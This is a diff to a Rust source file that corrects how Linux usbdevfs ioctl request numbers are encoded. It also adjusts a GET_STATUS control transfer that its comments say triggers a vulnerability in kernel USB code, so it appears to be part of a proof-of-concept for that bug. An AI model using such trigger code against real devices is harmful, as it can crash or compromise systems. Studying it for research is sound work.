@@ -37,39 +37,53 @@ struct USBClaimInterface {
 // Defined as a recursive macro in the kernel
 // include/uapi/linux/usbdevice_fs.h:187
 // #define USBDEVFS_CONTROL _IOWR('U', 0, struct usbdevfs_ctrltransfer)
-// #define USBDEVFS_BULK		_IOWR('U', 2, struct usbdevfs_bulktransfer)
 
-// include/uapi/asm-generic/ioctl.h:88
+// include/uapi/asm-generic/ioctl.h
 // #define _IOWR(type,nr,argtype)	_IOC(_IOC_READ|_IOC_WRITE,(type),(nr),(_IOC_TYPECHECK(argtype)))
 
-// include/uapi/asm-generic/ioctl.h:69
 // #define _IOC(dir,type,nr,size) \
 // 	(((dir)  << _IOC_DIRSHIFT) | \
 // 	 ((type) << _IOC_TYPESHIFT) | \
 // 	 ((nr)   << _IOC_NRSHIFT) | \
 // 	 ((size) << _IOC_SIZESHIFT))
 
+// #define _IOC_NRBITS	8
+// #define _IOC_TYPEBITS	8
+// #define _IOC_NRSHIFT	0
+// #define _IOC_TYPESHIFT	(_IOC_NRSHIFT+_IOC_NRBITS)
+// #define _IOC_SIZESHIFT	(_IOC_TYPESHIFT+_IOC_TYPEBITS)
+// #define _IOC_DIRSHIFT	(_IOC_SIZESHIFT+_IOC_SIZEBITS)
+
 #[inline(always)]
-const fn ioc_usbdev(request_size: u32, request_number: u32, direction: u32) -> u32 {
+const fn ioc_usbdev(direction: u32, request_size: u32, request_number: u32) -> u32 {
+    // For the sake of readability and matching with the Linux Kernel
+    const NRBITS: u32 = 8;
+    const TYPEBITS: u32 = 8;
+    const SIZEBITS: u32 = 14;
+    const NRSHIFT: u32 = 0;
+    const TYPESHIFT: u32 = NRSHIFT + NRBITS;
+    const SIZESHIFT: u32 = TYPESHIFT + TYPEBITS;
+    const DIRSHIFT: u32 = SIZESHIFT + SIZEBITS;
+
     const USBDEV_REQ_TYPE: u32 = b'U' as u32; // USB ioctl identifier
-    (direction << 30/*DIRSHIFT*/)
-        | (request_size << 16/*TYPESHIFT*/)
-        | (USBDEV_REQ_TYPE << 8/*NRSHIFT*/)
-        | request_number /*SIZESHIFT*/
+    (direction << DIRSHIFT)
+        | (USBDEV_REQ_TYPE << TYPESHIFT)
+        | (request_number << NRSHIFT)
+        | (request_size << SIZESHIFT)
 }
 
 // ioctl operation numbers
 const IOC_WRITE: u32 = 0x01;
 const IOC_READ: u32 = 0x02;
 const IOCTL_USB_CTRL: u32 = ioc_usbdev(
+    IOC_READ | IOC_WRITE,
     size_of::<USBControlTransfer>() as u32,
     0,
-    IOC_READ | IOC_WRITE,
 );
 const IOCTL_USB_BULK: u32 =
-    ioc_usbdev(size_of::<USBBulkTransfer>() as u32, 2, IOC_READ | IOC_WRITE);
+    ioc_usbdev(IOC_READ | IOC_WRITE, size_of::<USBBulkTransfer>() as u32, 2);
 const IOCTL_USB_CLAIM_INTERFACE: u32 =
-    ioc_usbdev(size_of::<USBClaimInterface>() as u32, 15, IOC_READ);
+    ioc_usbdev(IOC_READ, size_of::<USBClaimInterface>() as u32, 15);
 
 trait IoctlRequest {
     const IOCTL: libc::c_ulong;
@@ -180,13 +194,14 @@ impl USBDevice {
         // the vulnerability
         // The values in the kernel are defined in linux/include/uapi/linux/usb/ch9.h
         const USB_DIR_IN: u8 = 0x80; // Device should respond with data
+        const USB_TYPE_STANDARD: u8 = 0x00;
         const USB_RECIP_ENDPOINT: u8 = 0x02;
         const USB_REQ_GET_STATUS: u8 = 0x0;
         // The vulnerable code in the switch executes on Get status requests where the recipient is
         // an endpoint
         let mut control_request = USBControlTransfer {
-            req_type: USB_DIR_IN | USB_RECIP_ENDPOINT, // Direction | Type | Recipient
-            req: USB_REQ_GET_STATUS,                   // GET request code
+            req_type: USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_ENDPOINT, // Direction | Type | Recipient
+            req: USB_REQ_GET_STATUS,                                       // GET request code
             value: 0,
             index: 0,
             length: buf.len() as u16,
